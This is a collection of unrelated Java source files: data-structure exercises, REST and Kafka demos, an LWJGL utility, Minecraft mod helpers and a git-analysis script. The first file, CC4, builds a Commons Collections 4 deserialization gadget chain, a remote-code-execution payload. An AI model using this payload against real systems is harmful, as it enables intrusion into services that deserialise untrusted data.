[
    "package org.util;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections4.bag.TreeBag;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\n\npublic class CC4 {\n    public static byte[] cc4(String common) throws Exception {\n        TemplatesImpl template = TemplateUtils.getTemplate(common);\n        Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);\n        declaredConstructor.setAccessible(true);\n        InvokerTransformer newTransformer = declaredConstructor.newInstance(\"toString\");\n\n        TransformingComparator tc = new TransformingComparator(newTransformer);\n        TreeBag tb = new TreeBag(tc);\n        tb.add(template);\n\n        Field iMethodName = newTransformer.getClass().getDeclaredField(\"iMethodName\");\n        iMethodName.setAccessible(true);\n        iMethodName.set(newTransformer,\"newTransformer\");\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        new ObjectOutputStream(byteArrayOutputStream).writeObject(tb);\n        return byteArrayOutputStream.toByteArray();\n    }\n}\n",
    "package com.zavadimka.restapitests.homework;\n\nimport io.restassured.response.Response;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport static io.restassured.RestAssured.given;\nimport static io.restassured.http.ContentType.JSON;\nimport static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;\nimport static org.hamcrest.MatcherAssert.assertThat;\nimport static org.hamcrest.Matchers.*;\n\npublic class GetSingleResourceTest extends TestBase {\n\n    @Test\n    @DisplayName(\"Get Single resource test\")\n    void getSingleResourceShouldHaveStatus200() {\n        Response response = given()\n                .log().uri()\n                .log().method()\n                .log().body()\n                .contentType(JSON)\n                .when()\n                .get(\"/unknown/2\")\n                .then()\n                .log().status()\n                .log().body()\n                .body(matchesJsonSchemaInClasspath(\"homework/schemas/single_resource_schema.json\"))\n                .statusCode(200)\n                .extract().response();\n\n        assertThat(response.path(\"support.url\"), is(\"https://reqres.in/#support-heading\"));\n        assertThat(response.path(\"data.id\"), is(2));\n    }\n}\n",
    "\npublic class BinaryTree<E> {\n    public static class TreeNode<E> {\n     public E element;\n        public TreeNode<E> left;\n        public TreeNode<E> right;\n        public TreeNode<E> parent;\n             \n  public TreeNode(E elem) {\n            element = elem;\n            left = null;\n            right = null;\n\t    parent=null;          \n        }\n\n        public String toString() {\n            return element + \" \";\n        }\n    }\n     \n     public TreeNode<E> Root;\n      public int size;\n\n    public BinaryTree() {\n        Root = null;\n        size = 0;\n    }\n\n    public boolean hasLeft(TreeNode<E> node) {\n        return (node.left != null);\n    }\n\n    public boolean hasRight(TreeNode<E> node) {\n        return (node.right != null);\n\n    }\npublic int getSize() { return size; }\n\n    public boolean isEmpty() { return size == 0;}\n\n    public TreeNode<E> addRoot(E e) {\n        if (!isEmpty()) \n            System.out.println(\"Invalid action: Tree is not empty\");\n        else\n\t{\n        Root = new TreeNode<E>(e);\n        size = 1;}\n        return Root;\n    }\n\n    public TreeNode<E> search(TreeNode<E> root, E e, TreeNode<E> result) {\n        if (root == null) {\n            return null;\n        }\n        if (e == root.element) {\n            return root;\n        } else {\n            if (root.left != null) {\n                result = search(root.left, e, result);\n            }\n\n            if (root.right != null) {\n                result = search(root.right, e, result);\n            }\n\n            return result;\n        }\n\n    }\n public void addLeft(E e, E p) {\n        TreeNode<E> n = search(Root, p, null);\n        if (n != null) \n\t{\n            if (n.left != null){ \n                System.out.println(\"parent already has a left child\");}\n            else\n            {TreeNode<E> child = new TreeNode(e);\n            n.left = child;\n\t    child.parent=n;\n            size++;}\n        } \n\telse {\n            System.out.println(\"parent does not exist\");\n        }\n    }\n\n    public void addRight(E e, E p) {\n        TreeNode<E> n = search(Root, p, null);\n        if (n != null) {\n            if (n.right != null) {\n                System.out.println(\"parent already has a left child\");\n            }\n\t    else{\n            TreeNode<E> child = new TreeNode(e);\n            n.right = child;\n\t    child.parent=n;\n            size++;}\n        } \n\telse {\n            System.out.println(\"parent does not exist\");\n        }\n    }\n    //---------------------------Print Useing InOrder -------------------------------- \n    public void inDisplay(TreeNode<E> Tree) {\n        if (Tree != null) \n        {\n            inDisplay(Tree.left);\n            System.out.print(\"\\n\"+Tree);\n            inDisplay(Tree.right);            \n        }\n    }\n    //---------------------------Print Useing PreOrder -------------------------------- \n    public void PreDisplay(TreeNode<E> Tree) {\n        if (Tree != null) \n        {  \n            System.out.print(\"\\n\"+Tree);\n            PreDisplay(Tree.left);\n            PreDisplay(Tree.right);            \n        }\n    }\n    //---------------------------Print Useing PostOrder -------------------------------- \n    public void PostDisplay(TreeNode<E> Tree) {\n\n        if (Tree != null) \n        {\n            PostDisplay(Tree.left);\n            PostDisplay(Tree.right);   \n            System.out.println(Tree);\n            System.out.print(\"\\nRight Child \"+Tree.right);                       \n        }\n    }\n    \n    public void printallPost(TreeNode<E> Tree){\n        if(Tree != null){\n            printallPost(Tree.left);\n            printallPost(Tree.right);\n            System.out.println(Tree.element+\"\\t\");\n        }\n    }\n    \n    public void printExternal(TreeNode<E> Tree){\n        if(Tree != null){\n            printallPost(Tree.left);\n            if(Tree.left == null && Tree.right == null){\n                 System.out.println(Tree.element+\"\\t\");\n            }\n        }\n            printallPost(Tree.right);\n        }\n   public void Mirror(TreeNode<E> Tree){\n       // Recursive methode \n       TreeNode<E> right = Tree.right;\n       TreeNode<E> left = Tree.left;\n       Tree.left = right;\n       Tree.right = left;\n       Mirror(Tree.left);\n       Mirror(Tree.right);\n       \n              \n   }\n}\n",
    "package io.quarkiverse.seven.wonders.demo;\n\nimport jakarta.annotation.PostConstruct;\nimport jakarta.enterprise.context.ApplicationScoped;\nimport jakarta.ws.rs.GET;\nimport jakarta.ws.rs.Path;\nimport jakarta.ws.rs.Produces;\nimport org.mvnpm.importmap.Aggregator;\n\n/**\n * Dynamically create the import map\n */\n@ApplicationScoped\n@Path(\"/_importmap\")\npublic class ImportmapResource {\n    private String importmap;\n\n    // See https://github.com/WICG/import-maps/issues/235\n    // This does not seem to be supported by browsers yet...\n    @GET\n    @Path(\"/dynamic.importmap\")\n    @Produces(\"application/importmap+json\")\n    public String importMap() {\n        return this.importmap;\n    }\n\n    @GET\n    @Path(\"/dynamic-importmap.js\")\n    @Produces(\"application/javascript\")\n    public String importMapJson() {\n        return JAVASCRIPT_CODE.formatted(this.importmap);\n    }\n\n    @PostConstruct\n    void init() {\n        Aggregator aggregator = new Aggregator();\n        // Add our own mappings\n        aggregator.addMapping(\"icons/\", \"/icons/\");\n        aggregator.addMapping(\"components/\", \"/components/\");\n        aggregator.addMapping(\"fonts/\", \"/fonts/\");\n        this.importmap = aggregator.aggregateAsJson();\n    }\n\n    private static final String JAVASCRIPT_CODE = \"\"\"\n            const im = document.createElement('script');\n            im.type = 'importmap';\n            im.textContent = JSON.stringify(%s);\n            document.currentScript.after(im);\n            \"\"\";\n}\n",
    "/*\n * Copyright (c) 2002-2008 LWJGL Project\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *\n * * Redistributions of source code must retain the above copyright\n *   notice, this list of conditions and the following disclaimer.\n *\n * * Redistributions in binary form must reproduce the above copyright\n *   notice, this list of conditions and the following disclaimer in the\n *   documentation and/or other materials provided with the distribution.\n *\n * * Neither the name of 'LWJGL' nor the names of\n *   its contributors may be used to endorse or promote products derived\n *   from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n * TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n * PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\npackage org.lwjgl.util.glu;\n\nimport java.nio.FloatBuffer;\nimport java.nio.IntBuffer;\n\nimport org.lwjgl.BufferUtils;\n\nimport static org.lwjgl.opengl.GL11.*;\n\n/**\n * Project.java\n * <p/>\n * <p/>\n * Created 11-jan-2004\n *\n * @author Erik Duijs\n */\npublic class Project extends Util {\n\n    private static final float[] IDENTITY_MATRIX =\n            new float[] {\n                    1.0f, 0.0f, 0.0f, 0.0f,\n                    0.0f, 1.0f, 0.0f, 0.0f,\n                    0.0f, 0.0f, 1.0f, 0.0f,\n                    0.0f, 0.0f, 0.0f, 1.0f };\n\n    private static final FloatBuffer matrix = BufferUtils.createFloatBuffer(16);\n    private static final FloatBuffer finalMatrix = BufferUtils.createFloatBuffer(16);\n\n    private static final FloatBuffer tempMatrix = BufferUtils.createFloatBuffer(16);\n    private static final float[] in = new float[4];\n    private static final float[] out = new float[4];\n\n    private static final float[] forward = new float[3];\n    private static final float[] side = new float[3];\n    private static final float[] up = new float[3];\n\n    /**\n     * Make matrix an identity matrix\n     */\n    private static void __gluMakeIdentityf(FloatBuffer m) {\n        int oldPos = m.position();\n        m.put(IDENTITY_MATRIX);\n        m.position(oldPos);\n    }\n\n    /**\n     * Method __gluMultMatrixVecf\n     *\n     * @param finalMatrix\n     * @param in\n     * @param out\n     */\n    private static void __gluMultMatrixVecf(FloatBuffer finalMatrix, float[] in, float[] out) {\n        for (int i = 0; i < 4; i++) {\n            out[i] =\n                    in[0] * finalMatrix.get(finalMatrix.position() + i)\n                            + in[1] * finalMatrix.get(finalMatrix.position() + 4 + i)\n                            + in[2] * finalMatrix.get(finalMatrix.position() + 2*4 + i)\n                            + in[3] * finalMatrix.get(finalMatrix.position() + 3*4 + i);\n\n        }\n    }\n\n    /**\n     * @param src\n     * @param inverse\n     *\n     * @return true if the matrix was succesfully inverted\n     */\n    private static boolean __gluInvertMatrixf(FloatBuffer src, FloatBuffer inverse) {\n        int i, j, k, swap;\n        float t;\n        FloatBuffer temp = Project.tempMatrix;\n\n\n        for (i = 0; i < 16; i++) {\n            temp.put(i, src.get(i + src.position()));\n        }\n        __gluMakeIdentityf(inverse);\n\n        for (i = 0; i < 4; i++) {\n            /*\n             * * Look for largest element in column\n             */\n            swap = i;\n            for (j = i + 1; j < 4; j++) {\n                /*\n                 * if (fabs(temp[j][i]) > fabs(temp[i][i])) { swap = j;\n                 */\n                if (Math.abs(temp.get(j*4 + i)) > Math.abs(temp.get(i* 4 + i))) {\n                    swap = j;\n                }\n            }\n\n            if (swap != i) {\n                /*\n                 * * Swap rows.\n                 */\n                for (k = 0; k < 4; k++) {\n                    t = temp.get(i*4 + k);\n                    temp.put(i*4 + k, temp.get(swap*4 + k));\n                    temp.put(swap*4 + k, t);\n\n                    t = inverse.get(i*4 + k);\n                    inverse.put(i*4 + k, inverse.get(swap*4 + k));\n                    //inverse.put((i << 2) + k, inverse.get((swap << 2) + k));\n                    inverse.put(swap*4 + k, t);\n                    //inverse.put((swap << 2) + k, t);\n                }\n            }\n\n            if (temp.get(i*4 + i",
    "\npublic class LLstack<E> {\n\n    static class Node<E> {\n\n        private E element; // reference to the element stored at this node\n        private Node<E> next; // reference to the subsequent node in the list\n\n        public Node(E e, Node<E> n) {\n            element = e;\n            next = n;\n        }\n\n        public E getElement() {\n            return element;\n        }\n\n        public Node<E> getNext() {\n            return next;\n        }\n\n        public void setNext(Node<E> n) {\n            next = n;\n        }\n\n        public void setelement(E element) {\n            this.element = element;\n        }\n    }\n    private Node<E> top;   // reference to the head node \n    private int size;   // number of elements in the LLstack \n\n    public LLstack() {   // constructs an empty LLstack\n        top = null;\n        size = 0;\n    }\n\n    public int size() {\n        return size;\n    }\n\n    public boolean isEmpty() {\n        return size == 0;\n    }\n\n    public E top() {\n        if (isEmpty()) {\n            return null;\n        }\n        return top.getElement(); \n    }\n\n    public void push(E elem) {\n        Node<E> v = new Node<E>(elem, top);   // create and link-in a new node \n        top = v;\n        size++;\n    }\n\n    public E pop() {\n        if (isEmpty()) {\n            return null;\n        }\n        E temp = top.getElement();\n        top = top.getNext();   // link-out the former top node \n        size--;\n        return temp;\n    }\n\n    public void Display() {\n        LLstack<E> temp = new LLstack<E>();\n        while (!this.isEmpty()) {\n            System.out.println(this.top());\n            temp.push(this.pop());\n        }\n        while (!temp.isEmpty()) {\n            this.push(temp.pop());\n        }\n    }\n    public boolean find (E key){\n        \n        LLstack<E> list2 = new LLstack<>();\n        boolean is= false;\n        while(! isEmpty()){\n            E ele = pop();\n            list2.push(ele);\n            if(ele == key){\n                is = true;\n            }\n         \n        }\n        while(! list2.isEmpty()){\n          push(list2.pop());\n        \n    }return is;\n}\npublic void RemoveAllEllemnetE (E e){\n    LLstack<E> list = new LLstack<>();\n    while(! isEmpty()){   \n    E ele = top();\n    \n    if(ele == e){\n        pop();\n    }else{\n        ele = pop();\n        list.push(ele);\n    }\n    }\n    while(! list.isEmpty()){\n        push(list.pop());\n    }\n}\n    \n    \n}   ",
    "package me.earth.mc_runtime_test;\n\n/**\n * A controller class outside of our Mixin.\n * To modify the behaviour of McRuntimeTest you can hook into the methods of this class via a Mixin.\n */\npublic class McRuntimeTest {\n    /**\n     * Our Hook in Minecrafts setScreen/displayGuiScreen.\n     * If an error screen is displayed we make Minecraft exit.\n     * If a DeathScreen is displayed we respawn the player.\n     * You can hook into this method with a Mixin and return {@code false} to add your own custom behaviour.\n     *\n     * @return {@code true} if this hook should be used.\n     */\n    public static boolean screenHook() {\n        return true;\n    }\n\n    /**\n     * Our Hook in Minecrafts ticks that run every 50ms.\n     * Here we join a SinglePlayer world and wait for the chunk around the player to load.\n     * Then we wait an additional amount of ticks until we quit the game.\n     * You can hook into this method with a Mixin and return {@code false} to add your own custom behaviour.\n     *\n     * @return {@code true} if this hook should be used.\n     */\n    public static boolean tickHook() {\n        return true;\n    }\n\n}\n",
    "package com.ningning0111.controller;\n\nimport com.ningning0111.common.ApplicationConstant;\nimport com.ningning0111.common.BaseResponse;\nimport com.ningning0111.common.ErrorCode;\nimport com.ningning0111.common.ResultUtils;\nimport com.ningning0111.model.dto.QueryFileDTO;\nimport com.ningning0111.service.StoreFileService;\nimport io.swagger.v3.oas.annotations.Operation;\nimport io.swagger.v3.oas.annotations.tags.Tag;\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.multipart.MultipartFile;\n\nimport java.util.List;\n\n/**\n * @Project: com.ningning0111.controller\n * @Author: pgthinker\n * @GitHub: https://github.com/ningning0111\n * @Date: 2024/4/2 18:53\n * @Description:\n */\n@Tag(name=\"KnowStoreController\",description = \"\u77e5\u8bc6\u5e93\u6587\u4ef6\u5b58\u50a8\u63a5\u53e3\")\n@RestController\n@RequestMapping(ApplicationConstant.API_VERSION + \"/know\")\n@RequiredArgsConstructor\n@Slf4j\npublic class KnowStoreController {\n\n    private final StoreFileService storeFileService;\n    @Operation(summary=\"\u6587\u4ef6\u4e0a\u4f20\",description = \"\u6587\u4ef6\u4e0a\u4f20\")\n    @PostMapping(value=\"/file/upload\",headers = \"content-type=multipart/form-data\")\n    public BaseResponse addPdf(@RequestParam(\"file\") List<MultipartFile> file){\n        if(file.isEmpty()){\n            return ResultUtils.error(ErrorCode.PARAMS_ERROR,\"\u6587\u4ef6\u4e3a\u7a7a\");\n        }\n        return storeFileService.filesStore(file);\n    }\n    @Operation(summary = \"\u6587\u4ef6\u67e5\u8be2\",description = \"\u6587\u4ef6\u67e5\u8be2\")\n    @GetMapping(\"/contents\")\n    public BaseResponse queryFiles(QueryFileDTO request){\n        if(request.page() == null || request.pageSize() == null){\n            return ResultUtils.error(ErrorCode.PARAMS_ERROR,\"page \u6216 pageSize\u4e3a\u7a7a\");\n        }\n        return storeFileService.queryPage(request);\n    }\n    @Operation(summary = \"\u6587\u4ef6\u5220\u9664\",description = \"\u6587\u4ef6\u5220\u9664\")\n    @DeleteMapping(\"/delete\")\n    public BaseResponse deleteFiles(@RequestParam List<Long> ids){\n        return storeFileService.deleteFiles(ids);\n    }\n\n\n}\n",
    "package meowindexer;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport opennlp.tools.stemmer.PorterStemmer;\nimport org.jsoup.Jsoup;\nimport org.jsoup.nodes.Document;\n\npublic class tokenizer {\n  // NOTE: SUBCLASS Token\n  // =====================\n\n  /**\n   * Token class: represents a token with its count and position in the document\n   *\n   * @word: The token\n   * @count: The number of times the token appears in the document\n   * @position: The position of the token in the document (title, h1, h2, or\n   *            other)\n   *\n   */\n  public class Token {\n    public String word;\n    public int count;\n    public String position;\n\n    /**\n     * Constructor for the Token class\n     *\n     * @param word: The token\n     */\n    public Token(String word) {\n      this.word = word;\n      this.count = 1;\n      this.position = \"other\";\n    }\n\n    /**\n     * Increment the count of the token\n     */\n    public void increment() { count++; }\n  }\n\n  // NOTE: CLASS tokenizer |||| Data Members\n  private HashSet<String> stopWords;\n\n  /**\n   * Constructor for the tokenizer: loads\n   */\n  public tokenizer() {\n    stopWords = new HashSet<String>();\n    loadStopWords(\"stopwords-en.txt\");\n  }\n\n  public HashMap<String, Token> tokenize(Document doc) {\n    String text = doc.text();\n    List<String> tokens = tokenizeString(text);\n    tokens = stemTokens(tokens);\n    HashMap<String, Token> tokenMap = new HashMap<String, Token>();\n\n    for (String token : tokens) {\n      if (tokenMap.containsKey(token)) {\n        tokenMap.get(token).increment();\n      } else {\n        tokenMap.put(token, new Token(token));\n      }\n    }\n\n    fillPosistions(tokenMap, doc);\n\n    return tokenMap;\n  }\n\n  /**\n   * Load stop words from a file (stopwords-en.txt)\n   *\n   * @param filename: Name of the file containing stop words\n   */\n  private void loadStopWords(String filename) {\n    try {\n      // NOTE: root path is src/meowindexer/app/. everything is relative to this\n      // path\n      BufferedReader reader =\n          new BufferedReader(new FileReader(\"../data/\" + filename));\n      String line;\n      while ((line = reader.readLine()) != null) {\n        stopWords.add(line.trim());\n      }\n      reader.close();\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  /**\n   * Tokenize a string into words and remove non-alphabetic characters\n   *\n   * @param text: String to tokenize\n   * @return List of tokens\n   */\n  private List<String> tokenizeString(String text) {\n    List<String> tokens = new ArrayList<String>();\n\n    String cleanText = text.toLowerCase().replaceAll(\"[^a-zA-Z ]\", \"\");\n    String[] words = cleanText.split(\"\\\\s+\");\n\n    for (String word : words) {\n      if (word.length() > 1 && !isStopWord(word.trim())) {\n        tokens.add(word.trim());\n      }\n    }\n\n    return tokens;\n  }\n\n  /**\n   * Stem tokens using the Porter Stemmer\n   *\n   * @param tokens: List of tokens to stem\n   * @return List of stemmed tokens\n   */\n  private List<String> stemTokens(List<String> tokens) {\n    List<String> stemmedTokens = new ArrayList<String>();\n    PorterStemmer stemmer = new PorterStemmer();\n\n    for (String token : tokens) {\n      stemmedTokens.add(stemmer.stem(token));\n    }\n\n    return stemmedTokens;\n  }\n\n  /**\n   * Check if a word is a stop word\n   *\n   * @param word: Word to check\n   * @return True if the word is a stop word, false otherwise\n   */\n  private boolean isStopWord(String word) { return stopWords.contains(word); }\n\n  /**\n   * Fill the position of each token in the document (title, h1, h2, or other)\n   *\n   * @param tokens: Map of tokens\n   * @param doc:    Document to search for token positions\n   */\n  private void fillPosistions(HashMap<String, Token> tokens, Document doc) {\n    List<String> titleTokens = stemTokens(tokenizeString(doc.title()));\n    List<String> h1Tokens = stemTokens(tokenizeString(doc.select(\"h1\").text()));\n    List<String> h2Tokens = stemTokens(tokenizeString(doc.select(\"h2\").text()));\n\n    for (String token : tokens.keySet()) {\n      Token t = tokens.get(token);\n      if (titleTokens.contains(t.word)) {\n        t.position = \"title\";\n      } else if (h1Tokens.contains(t.word)) {\n        t.position = \"h1\";\n      } else if (h2Tokens.contains(t.word)) {\n        t.position = \"h2\";\n      }\n    }\n  }\n\n  /**\n   * Test the tokenizer\n   * visit https://en.wikipedia.org/wiki/Cat and print the tokens\n   */\n  public void test() {\n    final String ANSI_RESET = \"\\u001B[0m\";\n    final String ANSI_GREEN = \"\\u001B[32m\";\n\n    System.out.println(ANSI_GREEN);\n    System.out.println(\"Testing tokenizer...\");\n    System.out.println(ANSI_RESET);\n\n    Document doc = null;\n    final String url = \"https://en.wikipedia.org/wiki/Cat\";\n    try {\n      doc = Jsoup.connect(url).get();\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n\n    System.out.println(\"tokenizing: \" + url + \" : \" ",
    "package app5;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.apache.kafka.common.serialization.Serializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport org.springframework.boot.ApplicationRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.DefaultKafkaProducerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.listener.DeadLetterPublishingRecoverer;\nimport org.springframework.kafka.listener.DefaultErrorHandler;\nimport org.springframework.kafka.support.KafkaHeaders;\nimport org.springframework.kafka.support.serializer.DelegatingByTypeSerializer;\nimport org.springframework.messaging.handler.annotation.Header;\nimport org.springframework.stereotype.Component;\n\n@SpringBootApplication\npublic class SpringKafkaApp5 {\n\n\tprivate static final Logger logger = LoggerFactory.getLogger(SpringKafkaApp5.class);\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SpringKafkaApp5.class, args);\n\t}\n\n\tstatic class Producer {\n\n\t\t@Bean\n\t\tpublic ApplicationRunner runner(KafkaTemplate<String, Object> kafkaTemplate) {\n\t\t\treturn args -> {\n\t\t\t\tMap<Class<?>, Serializer<?>> delegates = new HashMap<>();\n\t\t\t\tdelegates.put(byte[].class, new ByteArraySerializer());\n\t\t\t\tdelegates.put(String.class, new StringSerializer());\n\t\t\t\t((DefaultKafkaProducerFactory<String, Object>) kafkaTemplate.getProducerFactory())\n\t\t\t\t\t\t.setValueSerializer(new DelegatingByTypeSerializer(delegates));\n\n\t\t\t\tkafkaTemplate.send(\"spring-kafka-app5-demo\", \"hello\");\n\n\t\t\t};\n\t\t}\n\t}\n\n\tstatic class Admin {\n\n\t\t@Bean\n\t\tpublic NewTopic springKafkaApp5DemoTopic() {\n\t\t\treturn TopicBuilder.name(\"spring-kafka-app5-demo\")\n\t\t\t\t\t.partitions(1)\n\t\t\t\t\t.replicas(3)\n\t\t\t\t\t.build();\n\t\t}\n\n\t\t@Bean\n\t\tpublic NewTopic springKafkaApp5DemoDltTopic() {\n\t\t\treturn TopicBuilder.name(\"spring-kafka-app5-demo.DLT\")\n\t\t\t\t\t.partitions(1)\n\t\t\t\t\t.replicas(3)\n\t\t\t\t\t.build();\n\t\t}\n\n\t}\n\n\t@Component\n\tstatic class Listener {\n\n\t\t@KafkaListener(id = \"sk-app5-demo-group\", topics = \"spring-kafka-app5-demo\")\n\t\tpublic void listen(Integer in) {\n\t\t\tlogger.info(\"Data Received : \" + in);\n\t\t}\n\n\t\t@Bean\n\t\tpublic DefaultErrorHandler errorHandler(DeadLetterPublishingRecoverer recoverer) {\n\t\t\treturn new DefaultErrorHandler(recoverer);\n\t\t}\n\n\t\t@Bean\n\t\tpublic DeadLetterPublishingRecoverer publisher(KafkaTemplate<String, Object> template) {\n\t\t\treturn new DeadLetterPublishingRecoverer(template);\n\t\t}\n\n\t\t@KafkaListener(id = \"from.dlt-app5\", topics = \"spring-kafka-app5-demo.DLT\",\n\t\t\t\tproperties = \"value.deserializer:org.apache.kafka.common.serialization.ByteArrayDeserializer\")\n\t\tpublic void listenFromDlt(byte[] in,\n\t\t\t\t\t\t\t\t  @Header(KafkaHeaders.RECEIVED_PARTITION) int partition,\n\t\t\t\t\t\t\t\t  @Header(KafkaHeaders.OFFSET) int offset) {\n\t\t\tlogger.info(\"DLT Data Received : {} from partition {} and offset {}.\", in, partition, offset);\n\t\t}\n\n\t}\n\n}\n",
    "/*      Remote player waypoints for Xaero's Map\n        Copyright (C) 2024  Leander Kn\u00fcttel\n\n        This program is free software: you can redistribute it and/or modify\n        it under the terms of the GNU General Public License as published by\n        the Free Software Foundation, either version 3 of the License, or\n        (at your option) any later version.\n\n        This program is distributed in the hope that it will be useful,\n        but WITHOUT ANY WARRANTY; without even the implied warranty of\n        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n        GNU General Public License for more details.\n\n        You should have received a copy of the GNU General Public License\n        along with this program.  If not, see <https://www.gnu.org/licenses/>.*/\n\npackage tbc.remote_player_waypoints_for_xaero.connections;\n\n/**\n * JSON object from dynmap API. Used to read the default world name.\n */\npublic class DynmapConfiguration {\n    public World[] worlds;\n    public static class World{\n        public String name;\n    }\n}\n",
    "///usr/bin/env jbang \"$0\" \"$@\" ; exit $?\n\n//JAVA 21+\n\n//DEPS com.h2database:h2-mvstore:2.2.224\n//DEPS org.eclipse.jgit:org.eclipse.jgit:6.9.0.202403050737-r\n//DEPS org.kohsuke:github-api:1.321\n//DEPS info.picocli:picocli:4.7.5\n//DEPS one.util:streamex:0.8.2\n//DEPS me.tongfei:progressbar:0.10.1\n//DEPS org.eclipse.collections:eclipse-collections:11.1.0\n\n//DEPS org.tinylog:tinylog-api:2.7.0\n//DEPS org.tinylog:tinylog-impl:2.7.0\n//DEPS org.tinylog:slf4j-tinylog:2.7.0 // because of jgit\n//FILES tinylog.properties\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Comparator;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Set;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.concurrent.Callable;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport java.util.stream.Collectors;\n\nimport me.tongfei.progressbar.ProgressBar;\nimport one.util.streamex.StreamEx;\nimport org.eclipse.collections.api.multimap.MutableMultimap;\nimport org.eclipse.collections.impl.factory.Multimaps;\nimport org.tinylog.Logger;\n\nimport org.eclipse.jgit.api.Git;\nimport org.eclipse.jgit.lib.Repository;\nimport org.eclipse.jgit.revwalk.RevCommit;\nimport org.eclipse.jgit.revwalk.RevWalk;\nimport org.h2.mvstore.MVMap;\nimport org.h2.mvstore.MVStore;\nimport org.kohsuke.github.GHPullRequest;\nimport org.kohsuke.github.GHPullRequestCommitDetail;\nimport org.kohsuke.github.GHRepository;\nimport org.kohsuke.github.GHUser;\nimport org.kohsuke.github.GitHub;\nimport org.kohsuke.github.PagedIterator;\nimport org.kohsuke.github.PagedSearchIterable;\n\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\n@Command(name = \"gcl\",\n        version = \"gcl 0.1.0\",\n        mixinStandardHelpOptions = true,\n        sortSynopsis = false)\npublic class gcl implements Callable<Integer> {\n\n    @Parameters(index = \"0\", description = \"The path to the git repository to analyse.\")\n    private Path repositoryPath;\n\n    @Option(names = \"--startrevision\", description = \"The first revision to check (tag or commit id). Excluded.\")\n    private String startCommitRevStr = \"v5.12\";\n\n    @Option(names = \"--endrevision\", description = \"The last revision to check (tag or commit id). Included.\")\n    private String endCommitRevStr = \"v5.13\";\n\n    @Option(names = \"--owner\", description = \"The GitHub owner of the repository\")\n    private String owner = \"JabRef\";\n\n    @Option(names = \"--repo\", description = \"The GitHub repository name\")\n    private String repository = \"jabref\";\n\n    @Option(names = \"--cols\", description = \"Number of columns\")\n    private Integer cols  = 6;\n\n    @Option(names = \"--filter\")\n    private List<String> ignoredUsers = List.of(\"koppor\", \"calixtus\", \"Siedlerchr\", \"tobiasdiez\", \"but\", \"k3KAW8Pnf7mkmdSMPHz27\", \"HoussemNasri\", \"dependabot[bot]\", \"dependabot\", \"apps/dependabot\", \"apps/githubactions\", \"ThiloteE\");\n\n    @Option(names = \"--filter-emails\")\n    private List<String> ignoredEmails = List.of(\n            \"118344674+github-merge-queue@users.noreply.github.com\", \"github-merge-queue@users.noreply.github.com\", \"gradle-update-robot@regolo.cc\", \"team@moderne.io\", \"49699333+dependabot[bot]@users.noreply.github.com\",\n            \"houssemnasri2001@gmail.com\", \"cc.snethlage@gmail.com\", \"50491877+calixtus@users.noreply.github.com\", \"siedlerkiller@gmail.com\", \"Siedlerchr@users.noreply.github.com\", \"320228+Siedlerchr@users.noreply.github.com\");\n\n    @Option(names = { \"-l\", \"--github-lookup\" }, 